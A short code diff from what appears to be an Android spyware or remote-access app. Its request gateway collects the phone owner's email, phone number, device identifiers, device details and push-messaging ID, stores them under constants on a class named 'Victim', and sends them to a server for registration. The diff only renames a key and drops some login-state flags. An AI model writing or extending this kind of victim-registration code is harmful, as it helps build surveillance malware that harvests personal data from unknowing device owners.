@@ -299,7 +299,7 @@ public class APIRequestGateway {
         final String email = profileUtils.getPrimaryEmail();
         final String phone = profileUtils.getPhone();
         final PrefUtils prefUtils = PrefUtils.getInstance(context);
-        final String fcmId = prefUtils.getString(Victim.KEY_FCM_ID);
+        final String fcmId = prefUtils.getString(PrefUtils.KEY_FCM_ID);
 
 
         //Attaching them with the request
@@ -310,7 +310,7 @@ public class APIRequestGateway {
                 .addParam(Victim.KEY_DEVICE_HASH, deviceHash)
                 .addParam(Victim.KEY_DEVICE_INFO_STATIC, getDeviceInfoStatic())
                 .addParam(Victim.KEY_DEVICE_INFO_DYNAMIC, getDeviceInfoDynamic())
-                .addParamIfNotNull(Victim.KEY_FCM_ID, fcmId)
+                .addParamIfNotNull(Victim.KEY_THE_FCM_ID, fcmId)
                 .addParamIfNotNull(Victim.KEY_EMAIL, email)
                 .addParamIfNotNull(Victim.KEY_PHONE, phone)
                 .build();
@@ -343,12 +343,7 @@ public class APIRequestGateway {
 
                     //Saving in preference
                     final SharedPreferences.Editor editor = prefUtils.getEditor();
-                    if (fcmId != null) {
-                        editor.putBoolean(PrefUtils.IS_FCM_SYNCED, true);
-                    }
-
                     editor.putString(KEY_API_KEY, apiKey).commit();
-                    editor.putBoolean(PrefUtils.IS_LOGGED_IN, true);
 
                     if (activity != null) {
 
